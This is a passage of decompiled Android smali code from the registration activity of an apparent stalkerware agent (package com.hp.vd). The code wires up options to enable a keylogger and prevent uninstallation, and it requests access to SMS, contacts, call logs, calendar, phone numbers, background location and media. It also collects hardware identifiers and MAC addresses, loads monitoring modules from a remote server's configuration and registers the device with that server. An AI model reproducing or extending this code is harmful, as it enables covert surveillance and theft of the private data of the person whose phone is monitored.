    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->checkboxEnableKeylogger:Landroid/widget/CheckBox;

    if-eqz v0, :cond_1

    invoke-virtual {v0, p1}, Landroid/widget/CheckBox;->setEnabled(Z)V

    :cond_1
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    if-eqz v0, :cond_2

    invoke-virtual {v0, p1}, Landroid/widget/EditText;->setEnabled(Z)V

    :cond_2
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailSecond:Landroid/widget/EditText;

    if-eqz v0, :cond_3

    invoke-virtual {v0, p1}, Landroid/widget/EditText;->setEnabled(Z)V

    :cond_3
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEndpoint:Landroid/widget/EditText;

    if-eqz v0, :cond_4

    invoke-virtual {v0, p1}, Landroid/widget/EditText;->setEnabled(Z)V

    :cond_4
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    if-eqz v0, :cond_5

    invoke-virtual {v0, p1}, Landroid/widget/Button;->setEnabled(Z)V

    invoke-virtual {v0, p1}, Landroid/widget/Button;->setClickable(Z)V

    :cond_5
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->textViewPreventUninstallation:Landroid/widget/TextView;

    if-eqz v0, :cond_6

    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setEnabled(Z)V

    :cond_6
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->textViewEnableKeylogger:Landroid/widget/TextView;

    if-eqz v0, :cond_7

    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setEnabled(Z)V

    :cond_7
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->textViewEnableSecondaryApp:Landroid/widget/TextView;

    if-eqz v0, :cond_8

    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setEnabled(Z)V

    :cond_8
    return-void
.end method


.method private restoreTosStatus()V
    .locals 4

    const-string v0, "system"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    if-eqz v0, :cond_1

    const-string v1, "BUNDLE_KEY_TOS"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lcom/hp/vd/RegisterActivity;->tosStatus:Ljava/lang/Boolean;

    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->checkboxTos:Landroid/widget/CheckBox;

    if-eqz v1, :cond_0

    invoke-virtual {v1, v0}, Landroid/widget/CheckBox;->setChecked(Z)V

    :cond_0
    return-void

    :cond_1
    return-void
.end method

.method private isPermissionDeclaredForCurrentDevice(Ljava/lang/String;)Z
    .locals 1

    invoke-direct {p0}, Lcom/hp/vd/RegisterActivity;->ensureDeclaredPermissionsCache()Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    move-result p1

    return p1
.end method

.method protected addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
    .locals 1

    invoke-direct {p0, p2}, Lcom/hp/vd/RegisterActivity;->isPermissionDeclaredForCurrentDevice(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {p0, p2}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {p1, p2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    move-result p1

    :cond_0
    return-void
.end method

.method protected ensureRuntimePermissions()V
    .locals 4

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-ge v0, v1, :cond_0

    return-void

    :cond_0
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const-string v1, "android.permission.READ_SMS"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.READ_CONTACTS"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x21

    if-ge v1, v2, :cond_1
    const-string v1, "android.permission.READ_CALL_LOG"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    :cond_1
    const-string v1, "android.permission.READ_CALENDAR"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1d

    if-ge v1, v2, :cond_2
    const-string v1, "android.permission.READ_PHONE_STATE"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    :cond_2
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_3

    const-string v1, "android.permission.READ_PHONE_NUMBERS"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    :cond_3
    const-string v1, "android.permission.ACCESS_FINE_LOCATION"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1f

    if-lt v1, v2, :cond_4

    const-string v1, "android.permission.BLUETOOTH_CONNECT"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.BLUETOOTH_SCAN"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    :cond_4
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x21

    if-ge v1, v2, :cond_5

    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    :cond_5
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x21

    if-lt v1, v2, :cond_6

    const-string v1, "android.permission.READ_MEDIA_IMAGES"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.READ_MEDIA_VIDEO"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.READ_MEDIA_AUDIO"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.NEARBY_WIFI_DEVICES"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    const-string v1, "android.permission.POST_NOTIFICATIONS"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V

    :cond_6
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_7

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    new-array v1, v1, [Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/String;

    const/16 v1, 0x3e9

    invoke-static {p0, v0, v1}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_7
    invoke-direct {p0}, Lcom/hp/vd/RegisterActivity;->requestBackgroundLocationIfNeeded()V

    return-void
.end method

.method private requestBackgroundLocationIfNeeded()V
    .locals 4

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1d

    if-lt v0, v1, :cond_1

    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {p0, v0}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "android.permission.ACCESS_BACKGROUND_LOCATION"

    invoke-static {p0, v0}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "android.permission.ACCESS_BACKGROUND_LOCATION"

    aput-object v2, v0, v1

    const/16 v1, 0x3ea

    invoke-static {p0, v0, v1}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_1
    return-void
.end method

.method protected install(Ljava/lang/String;)Z
    .locals 7

    .line 799
    new-instance v0, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v0}, Lcom/hp/vd/agent/Configuration;-><init>()V

    .line 805
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->deleteSecondaryAppDropImage()V

    .line 814
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getUtility()Lcom/hp/vd/agent/Utility;

    move-result-object v1

    .line 816
    invoke-virtual {v1, p1}, Lcom/hp/vd/agent/Utility;->getUniqueIdentifier(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 817
    invoke-virtual {v1, p1}, Lcom/hp/vd/agent/Utility;->getDeviceIdentifier(Ljava/lang/String;)Lcom/hp/vd/agent/DeviceIdentifier;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/agent/DeviceIdentifier;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x0

    if-eqz v2, :cond_8

    if-nez v1, :cond_0

    goto/16 :goto_3

    .line 833
    :cond_0
    new-instance v4, Lcom/hp/vd/data/SystemData;

    invoke-direct {v4}, Lcom/hp/vd/data/SystemData;-><init>()V

    .line 835
    invoke-virtual {v0}, Lcom/hp/vd/agent/Configuration;->getVersion()D

    move-result-wide v5

    invoke-static {v5, v6}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SystemData;->version:Ljava/lang/Double;

    .line 836
    invoke-virtual {v0}, Lcom/hp/vd/agent/Configuration;->getVersionCodename()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SystemData;->versionCodename:Ljava/lang/String;

    .line 838
    iput-object v2, v4, Lcom/hp/vd/data/SystemData;->identifier:Ljava/lang/String;

    .line 839
    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->identifierPlain:Ljava/lang/String;

    .line 840
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getUtility()Lcom/hp/vd/agent/Utility;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/agent/Utility;->getBuildSerial()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->buildSerial:Ljava/lang/String;

    .line 841
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getUtility()Lcom/hp/vd/agent/Utility;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/agent/Utility;->getWifiMacAddress()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->wifiMacAddress:Ljava/lang/String;

    .line 842
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getUtility()Lcom/hp/vd/agent/Utility;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/agent/Utility;->getBluetoothMacAddress()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->bluetoothMacAddress:Ljava/lang/String;

    .line 843
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getUtility()Lcom/hp/vd/agent/Utility;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/agent/Utility;->getCpuSerialNumber()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->cpuSerial:Ljava/lang/String;

    .line 845
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getUtility()Lcom/hp/vd/agent/Utility;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/agent/Utility;->generateSessionId()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->instance:Ljava/lang/String;

    .line 846
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getUtility()Lcom/hp/vd/agent/Utility;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/agent/Utility;->generateSessionId()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->session:Ljava/lang/String;

    .line 848
    invoke-virtual {v0}, Lcom/hp/vd/agent/Configuration;->getDefaultInitialWakeupInterval()I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->initialWakeupDelay:Ljava/lang/Integer;

    .line 849
    invoke-virtual {v0}, Lcom/hp/vd/agent/Configuration;->getDefaultHeartbeatInterval()I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->heartbeatInterval:Ljava/lang/Integer;

    .line 851
    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    iput-object v1, v4, Lcom/hp/vd/data/SystemData;->installedOn:Ljava/util/Date;

    const v1, 0x7f090024

    .line 854
    :try_start_0
    invoke-virtual {v0, p0, v4}, Lcom/hp/vd/agent/Configuration;->saveSystemData(Landroid/content/Context;Lcom/hp/vd/data/SystemData;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 855
    invoke-virtual {p0, v1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    return v3

    .line 870
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    iget-object v1, v4, Lcom/hp/vd/data/SystemData;->identifier:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/hp/vd/context/Context;->setName(Ljava/lang/String;)V

    .line 871
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    iget-object v1, v4, Lcom/hp/vd/data/SystemData;->identifierPlain:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/hp/vd/context/Context;->setNamePlain(Ljava/lang/String;)V

    .line 872
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    iget-object v1, v4, Lcom/hp/vd/data/SystemData;->instance:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/hp/vd/context/Context;->setInstance(Ljava/lang/String;)V

    .line 873
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    iget-object v1, v4, Lcom/hp/vd/data/SystemData;->session:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/hp/vd/context/Context;->setSession(Ljava/lang/String;)V

    .line 879
    new-instance v0, Lcom/hp/vd/module/custom/LogWriter;

    invoke-direct {v0}, Lcom/hp/vd/module/custom/LogWriter;-><init>()V

    .line 880
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0, v1}, Lcom/hp/vd/module/custom/LogWriter;->setContext(Lcom/hp/vd/context/Context;)V

    const-string v1, "built-in://LogWriter"

    .line 884
    invoke-virtual {v0, v1}, Lcom/hp/vd/module/custom/LogWriter;->install(Ljava/lang/String;)Z

    .line 885
    invoke-virtual {v0}, Lcom/hp/vd/module/custom/LogWriter;->initialize()Z

    .line 887
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1, v0}, Lcom/hp/vd/context/Context;->addModule(Lcom/hp/vd/module/IModule;)Z

    .line 888
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->refreshLog()V

    .line 895
    :try_start_1
    new-instance v1, Lcom/hp/vd/agent/ModuleManager;

    iget-object v2, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-direct {v1, v2}, Lcom/hp/vd/agent/ModuleManager;-><init>(Lcom/hp/vd/context/Context;)V

    .line 896
    invoke-virtual {v1}, Lcom/hp/vd/agent/ModuleManager;->getRemoteConfiguration()Ljava/util/ArrayList;

    move-result-object v1

    if-eqz v1, :cond_7

    .line 898
    invoke-virtual {v1}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_2

    goto/16 :goto_2

    .line 904
    :cond_2
    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_4

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/hp/vd/agent/ModuleManager$Configuration;

    .line 905
    iget-object v4, v2, Lcom/hp/vd/agent/ModuleManager$Configuration;->status:Ljava/lang/Integer;

    sget-object v5, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    if-eq v4, v5, :cond_3

    const-string v4, "###"

    .line 906
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "skipping installation for: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v2, Lcom/hp/vd/agent/ModuleManager$Configuration;->moduleClass:Ljava/lang/Class;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v4, v2}, Lcom/hp/vd/module/custom/LogWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_0

    .line 911
    :cond_3
    iget-object v2, v2, Lcom/hp/vd/agent/ModuleManager$Configuration;->moduleClass:Ljava/lang/Class;

    .line 912
    invoke-virtual {v2}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/hp/vd/module/IModule;

    .line 914
    iget-object v5, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-interface {v4, v5}, Lcom/hp/vd/module/IModule;->setContext(Lcom/hp/vd/context/Context;)V

    .line 915
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "built-in://"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v4, v2}, Lcom/hp/vd/module/IModule;->install(Ljava/lang/String;)Z

    .line 917
    iget-object v2, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2, v4}, Lcom/hp/vd/context/Context;->addModule(Lcom/hp/vd/module/IModule;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 930
    :cond_4
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->register(Ljava/lang/String;)Lcom/hp/vd/RegisterActivity$ResponseCombo;

    move-result-object p1

    .line 932
    iget-boolean v1, p1, Lcom/hp/vd/RegisterActivity$ResponseCombo;->result:Z

    if-nez v1, :cond_6

    .line 934
    iget-object v0, p1, Lcom/hp/vd/RegisterActivity$ResponseCombo;->code:Ljava/lang/Integer;

    if-eqz v0, :cond_5

    iget-object v0, p1, Lcom/hp/vd/RegisterActivity$ResponseCombo;->message:Ljava/lang/String;

    if-eqz v0, :cond_5

    iget-object v0, p1, Lcom/hp/vd/RegisterActivity$ResponseCombo;->code:Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    const/16 v1, 0x1d6

    if-ne v0, v1, :cond_5

    .line 935
    iget-object p1, p1, Lcom/hp/vd/RegisterActivity$ResponseCombo;->message:Ljava/lang/String;

    sput-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    goto :goto_1

    :cond_5
    const p1, 0x7f09002e

    .line 938
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    :goto_1
    return v3

    .line 950
    :cond_6
    invoke-virtual {v0}, Lcom/hp/vd/module/custom/LogWriter;->start()Z

    const-string p1, "system"

    .line 956
    invoke-virtual {p0, p1, v3}, Lcom/hp/vd/RegisterActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    .line 961
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v0, "is_installed"

    const/4 v1, 0x1

    .line 963
    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 968
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    return v1

    :cond_7
    :goto_2
    :try_start_2
    const-string p1, "Please make sure you are connected to the Internet. Cannot load configuration from server."

    .line 899
    sput-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    return v3

    :catch_0
    move-exception p1

    .line 921
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Could not instantiate class: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    return v3

    .line 861
    :catch_1
    invoke-virtual {p0, v1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    return v3

    :cond_8
    :goto_3
    const p1, 0x7f090026

    .line 820
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    return v3
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 5

    .line 253
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 255
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->requestWindowFeature(I)Z

    const p1, 0x7f080004

    .line 256
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->setContentView(I)V

    const p1, 0x7f060032

    .line 258
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->textViewPreventUninstallation:Landroid/widget/TextView;

    const p1, 0x7f06002e

    .line 259
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->textViewEnableKeylogger:Landroid/widget/TextView;

    const p1, 0x7f060014

    .line 261
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/CheckBox;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->checkboxTos:Landroid/widget/CheckBox;

    const p1, 0x7f060013

    .line 262
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/CheckBox;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->checkboxPreventUninstallation:Landroid/widget/CheckBox;

    const p1, 0x7f060012

    .line 263
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/CheckBox;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->checkboxEnableKeylogger:Landroid/widget/CheckBox;

    const p1, 0x7f060017

    .line 265
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    const p1, 0x7f060018

    .line 266
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailSecond:Landroid/widget/EditText;

    const p1, 0x7f060050

    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->editTextEndpoint:Landroid/widget/EditText;

    if-eqz p1, :cond_9
    const-string v0, "system"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    if-eqz v0, :cond_9

    sget-object v1, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_9

    invoke-virtual {p1, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    :cond_9

    const p1, 0x7f06000f

    .line 267
